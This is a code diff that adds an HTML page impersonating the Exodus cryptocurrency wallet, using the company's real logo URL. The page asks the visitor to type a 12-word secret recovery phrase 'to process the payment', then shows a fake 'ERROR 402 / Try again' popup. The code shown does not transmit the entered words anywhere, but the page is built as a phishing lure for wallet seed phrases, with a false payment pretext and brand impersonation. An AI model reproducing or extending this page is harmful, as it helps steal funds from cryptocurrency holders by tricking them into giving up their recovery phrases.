@@ -1,1 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Exodus – Secret Phrase</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=DejaVu+Sans&display=swap');
 
+    body {
+      margin: 0;
+      font-family: 'DejaVu Sans', sans-serif;
+      background: linear-gradient(to bottom, #30324f, #212035);
+      color: #d3d3d3;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100vh;
+      padding-top: 50px;
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      font-weight: bold;
+      color: white;
+      font-size: 1.5em;
+      margin-bottom: 8px;
+    }
+
+    p {
+      color: #b0b0b0;
+      margin-bottom: 30px;
+      font-size: 0.9em;
+    }
+
+    .phrase-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+      margin-bottom: 30px;
+      width: 60%;
+      max-width: 500px;
+    }
+
+    .phrase-grid input {
+      width: 75%;
+      padding: 10px;
+      background-color: #2a2b40;
+      border: 1px solid #3e3f58;
+      border-radius: 5px;
+      color: #d3d3d3;
+      font-size: 0.95em;
+    }
+
+    .phrase-grid input::placeholder {
+      color: #5a5a6e;
+    }
+
+    button {
+      background-color: #30324f;
+      color: white;
+      border: none;
+      padding: 10px 25px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1em;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #3b3d6b;
+    }
+
+    /* Popup styles */
+    .popup {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.7);
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+    }
+
+    .popup-content {
+      background: #2c2f4a;
+      padding: 30px;
+      border-radius: 8px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+
+    .popup-content h2 {
+      color: #fdf8f8;
+      margin-bottom: 10px;
+    }
+
+    .popup-content p {
+      margin-bottom: 20px;
+      color: #b0b0b0;
+    }
+
+    .popup-content button {
+      background-color: #44476a;
+      padding: 8px 20px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://www.exodus.com/brand/img/logo.svg" alt="Exodus Logo" class="logo">
+
+  <h1>Your Secret Phrase</h1>
+  <p>Write your secret phrase in the correct order to process the payment.</p>
+
+  <div class="phrase-grid">
+    <input type="text" placeholder="1">
+    <input type="text" placeholder="2">
+    <input type="text" placeholder="3">
+    <input type="text" placeholder="4">
+    <input type="text" placeholder="5">
+    <input type="text" placeholder="6">
+    <input type="text" placeholder="7">
+    <input type="text" placeholder="8">
+    <input type="text" placeholder="9">
+    <input type="text" placeholder="10">
+    <input type="text" placeholder="11">
+    <input type="text" placeholder="12">
+  </div>
+
+  <button onclick="showPopup()">Proceed</button>
+
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      <h2>ERROR 402</h2>
+      <p>Try again</p>
+      <button onclick="closePopup()">Okay</button>
+    </div>
+  </div>
+
+  <script>
+    function showPopup() {
+      document.getElementById('popup').style.display = 'flex';
+    }
+
+    function closePopup() {
+      document.getElementById('popup').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
